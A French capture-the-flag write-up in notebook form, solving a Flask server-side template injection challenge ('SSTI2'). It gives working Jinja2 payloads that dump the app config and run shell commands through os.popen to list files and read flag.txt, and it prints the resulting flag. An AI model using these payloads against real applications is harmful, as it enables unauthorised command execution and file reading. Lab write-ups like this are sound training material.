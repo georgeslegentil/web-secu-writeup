{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SSTI2\n",
    "\n",
    "> 200 points\n",
    "\n",
    "> https://ssti2.secu-web.blackfoot.dev/"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Première analyse\n",
    "\n",
    "- On a un champs text, qui, quand on rentre une string, l'écrit sur le site   \n",
    "- La page est créée coté serveur via un template\n",
    "- On sait que c'est une application Flask"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "On récupère la config \n",
    "\n",
    "```\n",
    "https://ssti1.secu-web.blackfoot.dev?username={{config.items()}}\n",
    "```\n",
    "\n",
    "Le flag n'est pas là"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Via les injections, on peut facilement importer des librairie, et par la même occasion executer des commandes à l'interieur du serveur avec la fonction **popen**\n",
    "\n",
    "Pour commencer on va faire un **ls**\n",
    "\n",
    "https://ssti2.secu-web.blackfoot.dev?username={{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"ls\").read()}}\n",
    "\n",
    "On remarque un fichier qui se nomme **flag.txt**\n",
    "\n",
    "On le **cat**\n",
    "\n",
    "https://ssti2.secu-web.blackfoot.dev?username={{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"cat flag.txt\").read()}}\n",
    "\n",
    "Le contenu du fichier est donc **BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}**\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Flag\n",
    "\n",
    "Le flag est donc - BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
